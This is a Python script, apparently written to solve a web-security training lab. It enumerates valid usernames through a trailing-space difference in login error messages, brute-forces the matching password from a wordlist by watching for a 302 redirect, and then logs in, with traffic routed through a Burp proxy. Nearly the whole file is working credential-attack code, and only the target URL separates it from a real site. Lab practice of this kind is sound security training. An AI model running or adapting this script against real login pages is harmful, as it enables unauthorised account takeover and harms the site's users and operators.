import requests
import re
from urllib.parse import urlencode

# Configuration
BASE_URL = "https://0ae000b404b76ad180141710004e00b5.web-security-academy.net"
LOGIN_ENDPOINT = "/login"
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # Burp Suite proxy
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"
VERIFY_SSL = False  # Set to False for lab environments with self-signed certificates

# Headers (adjust based on intercepted request from Burp)
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Step 1: Enumerate valid username
def enumerate_username():
    print("[*] Starting username enumeration...")
    with open(USERNAME_FILE, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    valid_username = None

    for username in usernames:
        data = {
            "username": username,
            "password": "invalidpassword"  # Arbitrary invalid password
        }
        response = session.post(
            BASE_URL + LOGIN_ENDPOINT,
            headers=HEADERS,
            data=urlencode(data),
            proxies=PROXY,
            verify=VERIFY_SSL
        )

        # Check for the subtle difference in error message (trailing space)
        error_message = re.search(r"Invalid username or password\.?\s*", response.text)
        if error_message and error_message.group(0).endswith(" "):
            print(f"[+] Found valid username: {username}")
            valid_username = username
            break
        else:
            print(f"[-] Tried username: {username}")

    return valid_username

# Step 2: Brute-force password for valid username
def brute_force_password(username):
    print(f"[*] Starting password brute-force for username: {username}...")
    with open(PASSWORD_FILE, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    valid_password = None

    for password in passwords:
        data = {
            "username": username,
            "password": password
        }
        response = session.post(
            BASE_URL + LOGIN_ENDPOINT,
            headers=HEADERS,
            data=urlencode(data),
            proxies=PROXY,
            verify=VERIFY_SSL,
            allow_redirects=False  # Prevent following redirects to detect 302
        )

        # Check for 302 status code indicating successful login
        if response.status_code == 302:
            print(f"[+] Found valid password: {password}")
            valid_password = password
            break
        else:
            print(f"[-] Tried password: {password}")

    return valid_password

# Step 3: Log in and access account page
def login_and_access_account(username, password):
    print("[*] Attempting to log in and access account page...")
    session = requests.Session()
    data = {
        "username": username,
        "password": password
    }
    response = session.post(
        BASE_URL + LOGIN_ENDPOINT,
        headers=HEADERS,
        data=urlencode(data),
        proxies=PROXY,
        verify=VERIFY_SSL
    )

    # Check if login was successful by accessing account page
    account_page = session.get(BASE_URL + "/my-account", proxies=PROXY, verify=VERIFY_SSL)
    if "My account" in account_page.text:  # Adjust based on actual account page content
        print("[+] Successfully logged in and accessed account page!")
        print("[+] Lab solved!")
    else:
        print("[-] Failed to access account page.")

# Main execution
def main():
    # Step 1: Enumerate username
    valid_username = enumerate_username()
    if not valid_username:
        print("[-] No valid username found. Exiting.")
        return

    # Step 2: Brute-force password
    valid_password = brute_force_password(valid_username)
    if not valid_password:
        print("[-] No valid password found. Exiting.")
        return

    # Step 3: Log in and solve the lab
    login_and_access_account(valid_username, valid_password)

if __name__ == "__main__":
    main()
